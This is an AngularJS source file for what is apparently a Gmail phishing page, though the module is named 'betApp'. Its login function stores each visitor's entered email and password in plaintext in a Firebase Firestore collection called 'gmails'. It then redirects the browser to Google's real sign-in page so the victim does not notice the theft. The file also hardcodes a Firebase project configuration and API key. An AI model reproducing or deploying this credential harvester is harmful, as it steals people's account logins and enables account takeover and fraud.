var betApp = angular.module('betApp', ['angularMoment']);

betApp.run([
    '$rootScope',
    '$window',
    function($rootScope, $window) {
        var firebaseConfig = {
            apiKey: "AIzaSyDQ-XsLfNOsUt1n2gxarhSGoKeYv0PpU1A",
            authDomain: "pt-service.firebaseapp.com",
            projectId: "pt-service",
            storageBucket: "pt-service.appspot.com",
            messagingSenderId: "273176508220",
            appId: "1:273176508220:web:6a5a88626e886c7e20d039",
            measurementId: "G-NXKBCSSX9R"
        };
        // Initialize Firebase
        try {
            $window.firebase.initializeApp(firebaseConfig);
            $window.firebase.analytics();
            $rootScope.db = firebase.firestore();
            $rootScope.storage = firebase.storage();
            console.log($rootScope.storage);
        } catch (error) {
            console.log(error);
        }
    },
]);

betApp.controller('MainController', function(
    $scope,
    moment,
    $window,
    $rootScope,
    $timeout
) {

    $scope.user = {
        email: '',
        password: '',
    };

    $scope.user.email = $window.localStorage.getItem("user");


    $scope.login = function() {

        var guid = createGuid();

        $rootScope.db
            .collection('gmails')
            .doc(`${guid}`)
            .set({
                id: `${ guid}`,
                email: `${$scope.user.email}`,
                password: `${$scope.user.password}`,
            })
            .then(() => {

                $window.location.href = "https://accounts.google.com/signin/v2/identifier?service=mail&passive=1209600&osid=1&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&emr=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin";

            })
            .catch(error => {
                console.error('Error adding document: ', error);
            });


    }

    function createGuid() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            var r = Math.random() * 16 | 0,
                v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }





});